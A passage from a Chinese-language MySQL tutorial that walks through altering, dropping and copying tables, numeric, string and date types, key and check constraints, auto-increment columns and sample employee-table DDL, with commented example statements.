修改book表的bName列名为bookName，要带上类型\nALTER TABLE book CHANGE COLUMN  bName bookName VARCHAR(20);\nDESC book;\n# 修改author表的id列的新类型为MEDIUMINT\nALTER TABLE author MODIFY COLUMN id MEDIUMINT;\nDESC author;\n# 为book表添加publishDate新列，类型为DATETIME\nALTER TABLE book ADD COLUMN publishDate DATETIME;\nDESC book;\n# 删除book表的publishDate列\nALTER TABLE book DROP COLUMN publishDate;\nDESC book;\n# 修改author表的表名为book_author\nALTER TABLE author RENAME TO book_author;\nDESC book_author;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 删除表\n\n语法：drop table [if exists] 表名。[if exists]和[if not exists]只在库和表的创建和删除时才能使用。\n\n# 删除表book_author\nDROP TABLE `test`.`book_author`;\n# 查看当前库里有哪些表\nSHOW TABLES;\n\n\n1\n2\n3\n4\n\n\n\n# 复制表\n\n * 只复制表结构：\n   create table 表名 like 被复制的表名;\n * 复制表结构以及表里的全部数据：\n   create table 表名 select * from 被复制的表名\n * 复制表的部分结构以及部分数据（如果只想把部分结构复制过去，可以将where后的条件设置成谁也不满足，例如1=2和0，而1是true）\n   create table 表名 select (列1, 列2) from 被复制的表名 where 数据限制条件。\n * 如果报1786 - Statement violates GTID consistency: CREATE TABLE ... SELECT.错误，是因为MySQ启用了enforce_gtid_consistency功能，只允许能够保障事务安全并且能够被日志记录的SQL语句被执行。create table 表名 as select * from 被复制的表名也会报同样的错误。\n   解决方法一：用命令修改SET @@GLOBAL.ENFORCE_GTID_CONSISTENCY = off;，但用命令我们需要用具有SUPER或者SYSTEM_VARIABLES_ADMIN权限的用户，这个权限自己去配。但是像本人使用的阿里云RDS MySql8.0版是不允许修改enforce_gtid_consistency参数的，这个可以去“云数据库RDS/实例列表/参数设置”进行查询确定。后续它的MySql更新版本，可能就可以直接使用create table ... select。\n   解决方法二：因为第一种用不了，那只能将语句拆成create table 表名 like 被复制的表名;和insert into 表名 select (列1, 列2) from 被复制的表名;，但是这样的话，它就做不到复制部分结构了，它第一句就复制了完整的结构。\n\n# 因为上一节已经删掉作者表，所以这里重新建author表\nCREATE TABLE IF NOT EXISTS `test`.`author` (\n  id          INT,          # 编号\n  aName       VARCHAR(20),  # 作者名\n  nation      VARCHAR(20)   # 国籍\n);\n# 插入数据\nINSERT INTO author VALUES\n(1, '村上春树', '日本'),\n(2, '莫言', '中国'),\n(3, '金庸', '中国'),\n(4, '冯唐', '中国');\nSELECT * FROM author;\n# 只复制表结构\nCREATE TABLE copy1 LIKE author;\n# 查看是否复制成功\nDESC copy1;\nSELECT * FROM copy1;\n# 复制表结构以及表里的全部数据，阿里云RDS MySql8.0版会报错，也不准修改enforce_gtid_consistency\nCREATE TABLE copy2 SELECT * FROM author;\n# 复制表的部分结构以及部分数据，阿里云RDS MySql8.0版会报错，也不准修改enforce_gtid_consistency\nCREATE TABLE copy3 SELECT id,aName FROM author WHERE nation='中国';\n# 只复制表部分结构，不携带数据，WHERE后面写0或者1=2\nCREATE TABLE copy4 SELECT id,aName FROM author WHERE 0;\n# 拆成两个部分，如果是在阿里云RDS MySql8.0版里\nCREATE TABLE copy5 LIKE author;\nINSERT INTO copy5 SELECT id,aName FROM author WHERE nation='中国';\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 常见数据类型\n\n\n# 数值型\n\n数值型分为以下几类\n\n * 整型：\n   * Tinyint：1字节，有符号是-128 ~ 127，无符号是0 ~ 255。\n   * Smallint：2字节，有符号是-32768 ~ 32767，无符号是0 ~ 65535。\n   * Mediumint：3字节，有符号是-8388608 ~ 8388607，无符号是0 ~ 1677215。\n   * Int、integer：4字节，有符号是-2147483648 ~ 2147483647，无符号是0 ~ 4294967295。\n   * Bigint：8字节，有符号是-2^63 ~ 2^63-1，无符号是0 ~ 2^64-1。\n * 浮点小数：\n   * float(M,D)：4字节，±1.75494351E-38~±3.402823466E+38\n   * double(M,D)：8字节，±2.2250738585072014E-308~±1.7976931348623157E+308\n * 定点小数：\n   * DEC(M,D)、DECIMAL(M,D)：M+2字节，最大取值范围与double相同，给定decimal的有效取值范围由M和D决定\n\n整型的特点：\n\n * 都可以设置无符号和有符号，默认有符号，通过unsigned设置无符号。其实不推荐使用unsigned，可以通过约束来实现的。\n * 如果超出了范围，会报out or range异常，最终会自动插入临界值；（“严格模式”并不会插入，直接认为你这条插入语句无效）\n * 长度可以不指定，默认会有一个长度；这个长度只是在数据库的显示长度，可以插入比这个“长度”长的数据。具体的插入范围是具体整型的范围了。\n * 如果显示指定了，但实际插入长度比它小，则左边用0填充显示，要注意的是必须需要搭配zerofill才能实现；但是用了zerofill，它会默认变为无符号整型（也就是说不用自己加unsigned）。其实不推荐使用zerofill，推荐使用LPAD()函数。\n\nDROP TABLE IF EXISTS tab_int;\nCREATE TABLE tab_int ( t1 INT );\n# 默认是有符号的，所以可以插入负数\nINSERT INTO tab_int VALUES(-123456);\nSELECT * FROM tab_int;\n# 新增一列，类型为int的无符号型。其实不推荐使用unsigned，可以通过约束来实现的。\nALTER TABLE tab_int ADD COLUMN t2 INT UNSIGNED;\nDESC tab_int;\n# 报错Out of range value\nINSERT INTO tab_int VALUES(-123456, -123456);\nSELECT * FROM tab_int;\n# 显示指定长度\nALTER TABLE tab_int ADD COLUMN t3 INT(6);\n# 可以插入比“长度”长的数据，“长度”只是一个显示长度，具体插入范围由INT范围决定\nINSERT INTO tab_int VALUES(-123456, 123456, 12345678);\n# 加上ZEROFILL关键字，在实际长度小于设置长度时，左边用0填充显示\nALTER TABLE tab_int ADD COLUMN t4 INT(6) ZEROFILL;\nDESC tab_int; # 其实不推荐使用zerofill，推荐使用LPAD()函数。\n# 仍然可以插入比“长度”长的数据，“长度”只是一个显示长度，具体插入范围由INT范围决定\nINSERT INTO tab_int VALUES(-123456, 123456, 12345678, 12345678);\n# 左边会用0填充显示\nINSERT INTO tab_int VALUES(-123456, 123456, 12345678, 123);\n# 但是加了ZEROFILL会导致这一列也变成了UNSIGNED，也就是无符号\nINSERT INTO tab_int VALUES(-123456, 123456, 12345678, -123);\nSELECT * FROM tab_int;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n浮点小数和定点小数的特点：\n\n * M代表整数部位+小数部位的个数，D代表小数部位；\n * 超出范围，如果是小数部位超出个数，会四舍五入舍弃多出的位数；如果是整数部位超出，会报out or range，直接自动插入四舍五入的临界值，例如M为3时它的临界值是999，但“严格模式”会认为这条报错语句最终无效，不会插入临界值。\n * M和D都可以省略，但对于定点数，M默认为10，D默认为0；\n * 如果精度要求较高，则优先考虑使用定点数；\n\nDROP TABLE IF EXISTS tab_float;\nCREATE TABLE tab_float (\n  f1 FLOAT(5, 2),\n  f2 DOUBLE(5, 2),\n  f3 DECIMAL(5, 2)\n);\nDESC tab_float;\nINSERT INTO tab_float VALUES(123.456, 123.45, 123.45);\nINSERT INTO tab_float VALUES(123.45, 123.456, 123.45);\n# 如果是小数部位超出个数，会四舍五入舍弃多出的位数\nINSERT INTO tab_float VALUES(123.45, 123.45, 123.456);\n# 如果是整数部位超出，会报`out or range`\nINSERT INTO tab_float VALUES(1523.4, 1523.4, 1523.4);\nSELECT * FROM tab_float;\nDROP TABLE IF EXISTS tab_float2;\n# 不加M和D，FLOAT和DOUBLE插入没有限制，而DECIMAL会让M默认为10，D为0\nCREATE TABLE tab_float2 (\n  f1 FLOAT,\n  f2 DOUBLE,\n  f3 DECIMAL\n);\nDESC tab_float2;\n# 如果是整数部位超出，会报`out or range`\nINSERT INTO tab_float2 VALUES(12.34, 12345678901.12, 12345678901);\n# DECIMAL的默认值(10, 0)表示会将小数位全部舍弃，但还是会按照四舍五入进行舍弃\nINSERT INTO tab_float2 VALUES(12.34, 12345678901.12, 1234567890.1);\nSELECT * FROM tab_float2;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 字符型\n\n * 较短的文本：\n   * char(M)，固定长度的字符串，最大长度不能超过M，其中M可以省略，默认为1。M为0~255之间的整数。\n   * varchar(M)，可变长度的字符串，最大长度不能超过M，其中M不可以省略。M为0~65535之间的整数。\n   * binary(M)，只包含二进制字符，固定字节数的字符串，最大字节数不能超过M，其中M可以省略，默认为1。M为0~255之间的整数。\n   * varbinary(M)，只包含二进制字符，可变字节数的字符串，最大字节数不能超过M，M为0~65535之间的整数。\n   * enum，枚举型，只能插入枚举列表里的其中一个字符。枚举列表最多有65535个成员。\n   * set，集合型，和枚举型有些像，但它的列表最多64个成员，使用它的时候可以取多个成员进行插入。\n * 较长的普通文本：\n   * Tinytext，文本的字符长度是0 ~ 255。（2^8-1）\n   * Text，文本的字符长度是0 ~ 65535。（2^16-1）\n   * Mediumtext，文本的字符长度是0 ~ 1677215。（2^24-1）\n   * Longtext，文本的字符长度是0 ~ 4294967295。（2^32-1）\n * 较长的二进制文本：\n   * Tinyblob，二进制文本的字节数是0 ~ 255。（2^8-1）\n   * Blob，二进制文本的字节数是0 ~ 65535。（2^16-1）\n   * Mediumblob，二进制文本的字节数是0 ~ 1677215。（2^24-1）\n   * Longblob，二进制文本的字节数是0 ~ 4294967295。（2^32-1）\n\n较短文本的特点：\n\n * char比较消耗存储空间，但是效率高。长度绝对固定的就用它。binary与它类似。\n * varchar比较节省存储空间，但效率低。长度不确定的就用它。varbinary于它类似。\n\nDROP TABLE IF EXISTS tab_char;\nCREATE TABLE tab_char (\n  c1 CHAR(3)\n);\nDESC tab_char;\n# 插入字符数超过了3，所以报错。这跟整型的显示长度是不一样的。\nINSERT INTO tab_char VALUES('abcd');\nINSERT INTO tab_char VALUES('abc');\nSELECT * FROM tab_char;\n# 新增c2列，类型为VARCHAR(5)\nALTER TABLE tab_char ADD COLUMN c2 VARCHAR(5);\n# 插入字符数超过了5，所以报错。\nINSERT INTO tab_char VALUES('abc', 'abcdef');\nINSERT INTO tab_char VALUES('abc', 'abcde');\nSELECT * FROM tab_char;\n# 新增c3列，类型为BINARY，默认字节数为1\nALTER TABLE tab_char ADD COLUMN c3 BINARY;\n# 字节数超过1，所以报错\nINSERT INTO tab_char VALUES('abc', 'abcde', 'ab');\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a');\nSELECT * FROM tab_char;\n# 新增c4列，类型为VARBINARY(6)\nALTER TABLE tab_char ADD COLUMN c4 VARBINARY(6);\n# 字节数超过6，所以报错\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a', 'abcdefg');\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a', 'abcdef');\nSELECT * FROM tab_char;\n# 新增c5列，类型为ENUM('a', 'c', 'd')\nALTER TABLE tab_char ADD COLUMN c5 ENUM('a', 'c', 'd');\n# e不在枚举列表中，所以报错\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a', 'abcdef', 'e');\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a', 'abcdef', 'd');\nSELECT * FROM tab_char;\n# 新增c6列，类型为SET('a', 'b', 'c')\nALTER TABLE tab_char ADD COLUMN c6 SET('a', 'b', 'c');\n# d不在集合列表中，所以报错\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a', 'abcdef', 'd', 'd');\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a', 'abcdef', 'd', 'a');\n# 可以组合使用set列表中的值，用逗号隔开，但是不能有空格\nINSERT INTO tab_char VALUES('abc', 'abcde', 'a', 'abcdef', 'd', 'b,c');\nSELECT * FROM tab_char;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n较长文本特点：可以将blob视为可以随心所欲扩大的varbinary。同样，可以将text视为可以随心所欲扩大的varchar。\n\n\n# 日期型\n\n日期型有如下几种：\n\n * date：格式是YYYY-MM-DD，范围是1000-01-01到9999-12-31。\n * datetime：格式是YYYY-MM-DD hh:mm:ss，范围是1000-01-01 00:00:00到9999-12-31 23:59:59。\n * timestamp：格式是YYYY-MM-DD hh:mm:ss，范围是UTC1970-01-01 00:00:01到UTC2038-01-19 03:14:07。\n * time：格式是hh:mm:ss，范围是-838:59:59，最大值838:59:59。带冒号的11:12意味着11:12:00，没带冒号的1112意味着00:11:12。\n * year：格式是YYYY，范围是1901到2155。\n\n日期型特点：\n\n * date只保存日期，time只保存时间，year只保存年份，datetime和timestamp保存日期+时间。\n * datetime的范围比timestamp要大，但是timestamp的保存和时区（time_zone）有关。\n\nDROP TABLE IF EXISTS tab_date;\nCREATE TABLE tab_date (\n  d1 YEAR,\n  d2 DATE,\n  d3 TIME,\n  d4 DATETIME,\n  d5 TIMESTAMP\n);\nINSERT INTO tab_date VALUES (NOW(), NOW(), NOW(), NOW(), NOW());\nSHOW VARIABLES LIKE 'time_zone';\nSELECT * FROM tab_date;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 常见约束和自增长列\n\n\n# 一些概念\n\n 1. 超键(Super Key)：在关系中能唯一标识元组的属性集。“关系”是一张表；“元组”是表中的每行；“属性集”是单个属性或一组属性；每列就是一个属性。（超键包含主键和候选键）\n 2. 候选键(Candidate Key)：如果一个属性集能唯一标识元组，且有不包含多余属性，那么这个属性集称为候选键。（也称最小超键，所以说超键包含候选键）\n 3. 主键(Primary Key)：关系模式中用户正在使用的候选键称主键（真正被选来标识元组的候选键）。\n    * 单主键：非空+唯一键值的一列做主键，优点是操作方便，缺点是可能没有具体含义。（没有含义的主键常称为逻辑主键，有含义的是业务主键）\n    * 复合主键(Compound Primary Key)：也叫做联合主键。多个列并列作为主键，优点是键值大多都有含义并会提高查询速度，缺点就是使用不太方便并且会降低了插入、删除、更新表的速度。\n 4. 外键(Foreign Key)：将一个表的值放入第二个表来表示关联，所使用的值是第一个表的主键值（在必要时可包括复合主键值）。此时，第二个表中保存这些值的属性称为外键，第一个表称为主表，第二个表称为从表。外键不一定要与相应的主键同名，比如在学生（学号，姓名，性别，班长）关系中，“学号”是主键，“班长”属性表示该学生所在班级的班长的学号，它引用了本关系中“学号”属性，因此“班长”是外键。\n 5. 数据库完整性(Database Integrity)：是指数据库中数据在逻辑上的一致性、正确性、有效性和相容性。\n    * 实体完整性(Entity Integrity)：指表中行的完整性。要求每个数据表都必须有主键，而作为主键的所有字段，其值必须是不重复且非空值。（实体是指一行数据或一条记录，表中不能存在完全相同的记录）\n    * 参照完整性(Referential Integrity)：也叫做引用完整性，用来规定主从表的引用规则。外键列值要非空值，如果要删除被引用的对象，那么也要删除引用它的所有对象，或者把引用值设置为空(如果允许的话)。例如，学生和班级关系中，外键“班级编号”的值不能为空，并且删除班级表中某个班级元组之前，必须先删除学生表中对应引用该班级的学生元组。\n    * 用户定义完整性(User-defined Integrity)：也叫做域完整性，是对数据表中字段属性的约束。包括字段的值域、字段的类型和字段的有效规则（如小数位数）等约束。\n 6. 约束：对数据表中某些列的进行按照约定（特定）条件作出限制，为了保证表中的数据的准确性和可靠性。\n    * 主键约束(Primary Key constraint)：要求主键列数据唯一，并且不允许为空。\n    * 外键约束(Foreign Key constraint)：用于在两个表之间建立关系，需要指定引用主表的哪一列。\n    * 唯一约束(Unique constraint)：要求该列唯一，允许为空，但只能出现一个空值。\n    * 检查约束(Check constraint)：某列取值范围限制，格式限制等，如有关年龄、邮箱（必须有@）的约束。\n    * 默认约束(Default constraint)：某列的默认值，如在数据库里有一项数据很多重复，可以设为默认值。\n    * 非空约束(NOT Null constraint)：某列的默认值，列数据的值不能为空，得是必填的。\n 7. MySQL8.0.16之前是检查约束在语法上是支持的并且也会解析，但数据库引擎不会执行这个功能，MySQL8.0.16之前是可以搭配“触发器”来实现的检查功能的。MySQL8.0.16之后就能使用它，并且语法和数据库引擎都支持它。\n\n\n# 主键约束\n\n主键约束让表的某列作为一个主要使用的唯一标识（一个表只能有一个主键），让每一行的数据是独一无二的（不可能存在相同主键值的两行数据）。\n\n列级约束是直接在列定义后面加上约束，而表级约束是在所有列定义完后加上约束。表级约束定义时可以使用多个候选键形成一个联合主键（复合主键），这适用于没引入无意义id时的场景。\n列级主键约束：列名 列的类型 PRIMARY KEY。\n表级主键约束：[CONSTRAINT [约束名]] PRIMARY KEY (列名[,列名...])，[]内容表示可以省略。\n\n表创建时没有加上主键约束，那可以在创建后使用ALTER TABLE 表名 ADD PRIMARY KEY(列名)来添加，还可以使用ALTER TABLE 表名 MODIFY COLUMN 列名 列的类型 PRIMARY KEY，甚至使用ALTER TABLE 表名 CHANGE COLUMN 旧列名 新列名 列的类型 PRIMARY KEY。\n\n删除主键就简单了，只需要ALTER TABLE 表名 DROP PRIMARY KEY即可。（ALTER TABLE 表名 MODIFY COLUMN 列名 列的类型和ALTER TABLE 表名 CHANGE COLUMN 旧列名 新列名 列的类型这两种删除方式是无效的）\n\nDROP TABLE IF EXISTS tab_primary;\n# 列级主键约束\nCREATE TABLE tab_primary(\n  id INT PRIMARY KEY,\n  name VARCHAR(12)\n);\nDESC tab_primary;\nSHOW CREATE TABLE tab_primary;\nINSERT INTO tab_primary VALUES(1, '张三');\n# 不允许出现相同的主键值\nINSERT INTO tab_primary VALUES(1, '李四');\nSELECT * FROM tab_primary;\nDROP TABLE IF EXISTS tab_primary2;\n# 表级主键约束，有三种写法\nCREATE TABLE tab_primary2(\n  id INT,\n  name VARCHAR(12),\n  PRIMARY KEY (id)                       # 省略了“CONSTRAINT 约束名”\n  # CONSTRAINT PRIMARY KEY (id)         # 省略了约束名\n  # CONSTRAINT pri_key PRIMARY KEY (id) # 完整写法\n);\nDESC tab_primary2;\nSHOW CREATE TABLE tab_primary2;\nINSERT INTO tab_primary2 VALUES(1, '张三');\nINSERT INTO tab_primary2 VALUES(2, '李四');\nSELECT * FROM tab_primary2;\nDROP TABLE IF EXISTS tab_primary3;\n# 搭配ALTER来使用主键约束\nCREATE TABLE tab_primary3(\n  id INT,\n  name VARCHAR(12)\n);\nSHOW CREATE TABLE tab_primary3;\n# 添加主键约束\nALTER TABLE tab_primary3 ADD PRIMARY KEY(id);\n# 添加主键约束（要带上类型），MODIFY方式修改主键约束很少用\nALTER TABLE tab_primary3 MODIFY COLUMN id INT PRIMARY KEY;\n# 添加主键约束（要带上类型），CHANGE式修改主键约束很少用\nALTER TABLE tab_primary3 CHANGE COLUMN id id INT PRIMARY KEY;\n# 删除主键约束（无论表级还是列级），因为主键只有一个所以省略了列名\nALTER TABLE tab_primary3 DROP PRIMARY KEY;\n# ALTER TABLE tab_primary3 MODIFY COLUMN id INT; # 该方法删除主键无效\n# ALTER TABLE tab_primary3 CHANGE COLUMN id id INT; # 该方法删除主键无效\nDESC tab_primary3;\nDROP TABLE IF EXISTS tab_primary4;\n# 联合主键\nCREATE TABLE tab_primary4(\n  name VARCHAR(12),\n  boId INT,\n  soId INT,\n  PRIMARY KEY (boId, soId)\n);\n# 删除联合主键，这个和单主键一样的写法\nALTER TABLE tab_primary4 DROP PRIMARY KEY;\n# 再次添加联合主键，这个和单主键一样的写法，只是括号里多了一个\nALTER TABLE tab_primary4 ADD PRIMARY KEY(boId, soId);\nDESC tab_primary4;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n主键约束与唯一约束异同点：\n\n * 它们基本都能保证数据的唯一性。\n * 主键约束所在列的值不能为空，而唯一约束所在列的值可以为空。（“空”不等于“空”，所以在一定意义上保证了唯一性）\n * 主键约束至多有一个，即使是联合主键（复合主键）也只是联合在一起，形成一个主键；唯一约束可以有多个，也能联合。\n\n\n# 外键约束\n\n外键约束定义在从表里，用来关联主表的，在加外键约束时主表必须存在。它的写法只有表级外键约束：[CONSTRAINT [约束名]] FOREIGN KEY (列名[,列名...]) REFERENCES 主表名(列名[,列名...])，[]内容表示可以省略。\n\n表创建时没有加上外键约束，那可以在创建后使用ALTER TABLE 从表名 ADD FOREIGN KEY(列名) REFERENCES 主表名(列名)来添加。\n\n外键约束的删除是ALTER TABLE 表名 DROP FOREIGN KEY 约束名，约束名必须通过SHOW CREATE TABLE 表名进行查询。\n\n# 主表必须存在\nCREATE TABLE tab_parent(\n  id INT PRIMARY KEY,\n  name VARCHAR(10)\n);\nCREATE TABLE tab_child(\n  id INT PRIMARY KEY,\n  parentId INT,\n  name VARCHAR(10),\n  # 外键约束的简便写法\n  FOREIGN KEY (parentId) REFERENCES tab_parent(id)\n);\n# 查看“Create Table”里的外键信息\nSHOW CREATE TABLE tab_child;\nDROP TABLE IF EXISTS tab_child2;\nCREATE TABLE tab_child2(\n  id INT PRIMARY KEY,\n  parentId INT,\n  name VARCHAR(10)\n);\n# 表创建后再加外键约束\nALTER TABLE tab_child2 ADD FOREIGN KEY (parentId) REFERENCES tab_parent(id);\nSHOW CREATE TABLE tab_child2;\n# 删除时必须先使用SHOW CREATE TABLE查到外键约束名，查到是tab_child2_ibfk_1\nALTER TABLE tab_child2 DROP FOREIGN KEY tab_child2_ibfk_1;\n# 先删从表再删主表\nDROP TABLE IF EXISTS tab_child;\nDROP TABLE IF EXISTS tab_child2;\nDROP TABLE IF EXISTS tab_parent;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 唯一\\检查\\默认\\非空约束\n\n默认约束和非空约束只支持列级约束，唯一约束和检查约束是列级约束和表级约束都支持。\n\n表创建时添加约束\n\nCREATE TABLE 表名(\n  列名1 列的类型 UNIQUE,          # 唯一约束\n  列名2 列的类型 CHECK(exp),      # 检查约束，exp是检查表达式，表达式包含了列2\n  列名3 列的类型 DEFAULT value,   # 默认约束，value就是默认值\n  列名4 列的类型 NOT NULL         # 非空约束\n);\nCREATE TABLE 表名(\n  列名1 列的类型,\n  列名2 列的类型,\n  列名3 列的类型 DEFAULT value,     # 默认约束，value就是默认值\n  列名4 列的类型 NOT NULL,          # 非空约束\n  UNIQUE(列名1),                   # 唯一约束\n  CHECK(exp)                       # 检查约束，exp是检查表达式，表达式包含了列2\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n表创建后添加/删除这些约束：\n\n * 非空约束和默认约束的添加：ALTER TABLE 表名 MODIFY COLUMN 列名 列的类型 约束或者ALTER TABLE 表名 CHANGE COLUMN 旧列名 新列名 列的类型 约束。\n * 非空约束和默认约束的删除：ALTER TABLE 表名 MODIFY COLUMN 列名 列的类型或者ALTER TABLE 表名 CHANGE COLUMN 旧列名 新列名 列的类型。\n * 检查约束的添加：ALTER TABLE 表名 ADD CHECK约束。\n * 检查约束的删除：ALTER TABLE 表名 DROP CHECK 约束名，这个约束名得通过SHOW CREATE TABLE 表名进行查询。\n * 唯一约束的添加：ALTER TABLE 表名 ADD UNIQUE(列名)。\n * 唯一约束的删除：ALTER TABLE 表名 DROP INDEX 列名。\n\nDROP TABLE IF EXISTS tab_constraint;\nCREATE TABLE tab_constraint(\n  id INT PRIMARY KEY,                              # 主键约束\n  name VARCHAR(10) NOT NULL,                      # 非空约束\n  gender CHAR CHECK(gender='男' or gender='女'),   # 检查约束\n  seat INT UNIQUE,                                # 唯一约束\n  age INT DEFAULT 18                              # 默认约束\n  # CHECK(gender='男' or gender='女')             # 表级检查约束\n);\n# 验证age的默认约束是否生效\nINSERT INTO tab_constraint (id,name,gender,seat) VALUES(0, '张三', '男', 1);\n# 验证seat的唯一约束是否生效\nINSERT INTO tab_constraint (id,name,gender,seat) VALUES(1, '李四', '男', 1);\nINSERT INTO tab_constraint (id,name,gender,seat) VALUES(1, '李四', '男', 2);\n# 验证gender的检查约束是否生效\nINSERT INTO tab_constraint (id,name,gender,seat) VALUES(2, '王五', '无', 3);\nINSERT INTO tab_constraint (id,name,gender,seat) VALUES(2, '王五', '女', 3);\n# 验证name的非空约束是否生效\nINSERT INTO tab_constraint (id,name,gender,seat) VALUES(3, NULL, '女', 4);\nINSERT INTO tab_constraint (id,name,gender,seat) VALUES(3, '赵六', '女', 4);\nSELECT * FROM tab_constraint;\nDROP TABLE IF EXISTS tab_constraint2;\n# 唯一约束和检查约束支持表级\nCREATE TABLE tab_constraint2(\n  id INT,\n  name VARCHAR(10) NOT NULL,\n  gender CHAR,\n  seat INT,\n  age INT DEFAULT 18,\n  PRIMARY KEY(id),\n  CHECK(gender='男' or gender='女'),\n  UNIQUE(seat)\n);\nSHOW CREATE TABLE tab_constraint2;\n# 删除name的非空约束（MODIFY方式删除非空约束）\nALTER TABLE tab_constraint2 MODIFY COLUMN name VARCHAR(10);\n# 重新增加name的非空约束（MODIFY方式增加非空约束）\nALTER TABLE tab_constraint2 MODIFY COLUMN name VARCHAR(10) NOT NULL;\n# 重新删除name的非空约束（CHANGE方式删除非空约束）\nALTER TABLE tab_constraint2 CHANGE COLUMN name name VARCHAR(10);\n# 再重新增加name的非空约束（CHANGE方式增加非空约束）\nALTER TABLE tab_constraint2 CHANGE COLUMN name name VARCHAR(10) NOT NULL;\n# 删除gender的检查约束，这里删除就别使用MODIFY或CHANGE方式了\nALTER TABLE tab_constraint2 DROP CHECK tab_constraint2_chk_1;\n# 重新增加gender的检查约束，这里增加就别使用MODIFY或CHANGE方式了\nALTER TABLE tab_constraint2 ADD CHECK(gender='男' or gender='女');\n# 删除seat的唯一约束，这里删除就别使用MODIFY或CHANGE方式了\nALTER TABLE tab_constraint2 DROP INDEX seat;\n# 重新增加seat的唯一约束，这里增加就别使用MODIFY或CHANGE方式了\nALTER TABLE tab_constraint2 ADD UNIQUE(seat);\n# 删除age的默认约束（MODIFY方式删除默认约束）\nALTER TABLE tab_constraint2 MODIFY COLUMN age INT;\n# 重新增加age的默认约束（MODIFY方式增加默认约束）\nALTER TABLE tab_constraint2 MODIFY COLUMN age INT DEFAULT 18;\n# 重新删除age的默认约束（CHANGE方式删除默认约束）\nALTER TABLE tab_constraint2 CHANGE COLUMN age age INT;\n# 再重新增加age的默认约束（CHANGE方式增加默认约束）\nALTER TABLE tab_constraint2 CHANGE COLUMN age age INT DEFAULT 18;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n\n# 自增长列\n\n自增长列又称为标识列，它可以不手动的插入值，系统提供默认的序列值。写法：列名 列的类型 列的约束 AUTO_INCREMENT。\n\nDROP TABLE IF EXISTS tab_increment;\nCREATE TABLE tab_increment(\n  id INT PRIMARY KEY AUTO_INCREMENT,\n  name VARCHAR(20)\n);\nINSERT INTO tab_increment VALUES(NULL, '张三');\nINSERT INTO tab_increment VALUES(NULL, '李四');\nINSERT INTO tab_increment VALUES(NULL, '王五');\nINSERT INTO tab_increment (name) VALUES('赵六');\nSELECT * FROM tab_increment;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 新建员工相关表的sql\n\nDROP TABLE IF EXISTS `employees`;\nDROP TABLE IF EXISTS `departments`;\nDROP TABLE IF EXISTS `locations`;\nDROP TABLE IF EXISTS `jobs`;\n\n# 建locations表\nCREATE TABLE `locations` (\n  `location_id` INT(11) NOT NULL AUTO_INCREMENT COMMENT '位置编号',\n  `street_address` VARCHAR(40) COMMENT '街道',\n  `postal_code` VARCHAR(12) COMMENT '邮编',\n  `city` VARCHAR(30) COMMENT '城市',\n  `state_province` VARCHAR(25) COMMENT '州/省',\n  `country_id` VARCHAR(2) COMMENT '国家编号',\n  PRIMARY KEY (`location_id`)\n) COMMENT '位置表';\n\n# 建departments表\nCREATE TABLE `departments` (\n  `department_id` INT(4) NOT NULL AUTO_INCREMENT COMMENT '部门编号',\n  `department_name` VARCHAR(3) COMMENT '部门名称',\n  `manager_id` INT(6) COMMENT '部门领导的员工编号',\n  `location_id` INT(4) COMMENT '位置编号',\n  PRIMARY KEY (`department_id`),\n  CONSTRAINT `loc_id_fk` FOREIGN KEY (`location_id`) REFERENCES `locations` (`location_id`)\n) COMMENT '部门表';\n\n# 建jobs表\nCREATE TABLE `jobs` (\n  `job_id` VARCHAR(10) NOT NULL COMMENT '工种编号',\n  `job_title` VARCHAR(35) COMMENT '工种名称',\n  `min_salary` INT(6) COMMENT '最低薪酬',\n  `max_salary` INT(6) COMMENT '最高薪酬',\n  PRIMARY KEY (`job_id`)\n) COMMENT '工种表';\n\n# 建employees表\nCREATE TABLE `employees` (\n  `employee_id` INT(6) NOT NULL AUTO_INCREMENT COMMENT '员工编号',\n  `first_name` VARCHAR(20) COMMENT '名',\n  `last_name` VARCHAR(25) COMMENT '姓',\n  `email` VARCHAR(25) COMMENT '邮箱',\n  `phone_number` VARCHAR(20) COMMENT '电话号码',\n  `job_id` VARCHAR(10) COMMENT '工种编号',\n  `salary` DOUBLE(10,2) COMMENT '月薪',\n  `commission_pct` DOUBLE(4,2) COMMENT '奖金率',\n  `manager_id` INT(6) COMMENT 